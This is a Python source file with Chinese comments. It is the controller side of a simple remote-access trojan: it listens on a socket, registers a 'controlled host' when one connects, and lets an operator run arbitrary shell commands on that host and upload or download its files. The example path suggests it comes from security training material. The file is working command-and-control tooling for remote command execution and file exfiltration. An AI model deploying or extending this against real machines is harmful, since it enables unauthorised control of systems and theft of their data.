#!/usr/bin/python3
# -*- coding: utf-8 -*-

import socket
import os
import struct

# 文件上传函数
def upload_file(conn, addr, command):
    try:
        # 把主控端的命令发送给被控端
        conn.sendall(command.encode())
        # 从命令中分离出要上传文件的路径
        command_list = command.split()
        upload_file_path = command_list[1]

        # 检查文件是否存在
        if os.path.isfile(upload_file_path):
            # 先传输文件信息，防止粘包
            # 定义文件信息，128s 表示文件名长度为 128 bytes，l 表示一个 int 用来表示文件大小
            file_info = struct.pack('128sl', bytes(os.path.basename(upload_file_path).encode('utf-8')), os.stat(upload_file_path).st_size)
            conn.sendall(file_info)
            print(f'[+] 文件信息发送成功！文件名: {os.path.basename(upload_file_path)}  大小: {os.stat(upload_file_path).st_size}')

            # 开始传输文件内容
            print('[+] 开始上传...')
            with open(upload_file_path, 'rb') as f:
                while True:
                    # 分块多次读，防止文件过大一次性读完导致内存不足
                    data = f.read(1024)
                    if not data:
                        print("文件发送完成！")
                        break
                    conn.sendall(data)
    except Exception as e:
        print(f"文件上传出错: {e}")

# 文件下载函数
def download_file(conn, addr, command):
    try:
        # 把主控端的命令发送给被控端
        conn.sendall(command.encode())
        # 先接收文件的信息，进行解析
        file_info = conn.recv(struct.calcsize('128sl'))
        if file_info:
            # 按照同样的格式（128sl）进行拆包
            file_name, file_size = struct.unpack('128sl', file_info)
            # 去除文件名后面多余的空字符
            file_name = file_name.decode().strip('\00')
            # 定义下载文件的存放路径，./ 表示当前目录下
            new_file_name = os.path.join('./', file_name)
            print(f'文件信息接收完成！文件名: {file_name}  大小: {file_size}')

            # 开始接收文件内容
            print('开始接收...')
            received_size = 0
            with open(new_file_name, 'wb') as f:
                while received_size < file_size:
                    if file_size - received_size > 1024:
                        data = conn.recv(1024)
                        f.write(data)
                        received_size += len(data)
                    else:
                        # 剩下内容不足 1024 时，接收剩余全部内容并写入
                        data = conn.recv(file_size - received_size)
                        f.write(data)
                        received_size = file_size
                        break
            print("文件接收完成！")
    except Exception as e:
        print(f"文件下载出错: {e}")

# 文件传输函数
def transfer_files(conn, addr):
    print("使用方法: method filepath")
    print("示例: upload /root/ms08067 | download /root/ms08067")
    while True:
        command = input("[文件传输]>>> ")
        command_list = command.split()
        if not command_list:
            continue
        if command_list[0] == 'exit':
            # 主控端退出相应模块时，通知被控端退出对应的功能模块
            conn.sendall('exit'.encode())
            break
        # 若方法为 download，表示主控端需要获取被控端的文件
        elif command_list[0] == 'download':
            download_file(conn, addr, command)
        elif command_list[0] == 'upload':
            upload_file(conn, addr, command)

# 命令执行函数
def exec_command(conn, addr):
    while True:
        command = input("[命令执行]>>> ")
        if command == 'exit':
            # 主控端退出相应模块时，通知客户端退出对应的功能模块
            conn.sendall('exit'.encode())
            break
        try:
            conn.sendall(command.encode())
            result = conn.recv(10000).decode()
            print(result)
        except Exception as e:
            print(f"命令执行出错: {e}")

if __name__ == '__main__':
    # 主控端监听地址
    server_ip = '127.0.0.1'
    # 主控端监听端口
    server_port = 6666
    server_addr = (server_ip, server_port)

    # 主控端开始监听
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind(server_addr)
        server_socket.listen(1)
    except socket.error as message:
        print(message)
        os._exit(0)

    print("[*] 服务器已启动！")

    conn, addr = server_socket.accept()
    # 接收并打印上线主机的主机名，地址和端口
    host_name = conn.recv(1024)
    print(f"[+] 主机已上线！ \n ============ \n 主机名: {bytes.decode(host_name)} IP: {addr[0]} \n 端口: {addr[1]} \n ============ \n")
    try:
        while True:
            print("功能选择:\n")
            print("[1] 命令执行 \n[2] 文件传输\n")
            choice = input('[无]>>> ')
            # 给被控端发送指令，主控端进入相应的功能模块
            if choice == '1':
                # 发送的命令为 str 型，需要 encode 转换为 bytes 型
                conn.sendall('1'.encode())
                exec_command(conn, addr)
            elif choice == '2':
                conn.sendall('2'.encode())
                transfer_files(conn, addr)
            elif choice == 'exit':
                conn.sendall('exit'.encode())
                server_socket.close()
                break
    except Exception as e:
        print(f"出现异常: {e}")
        server_socket.close()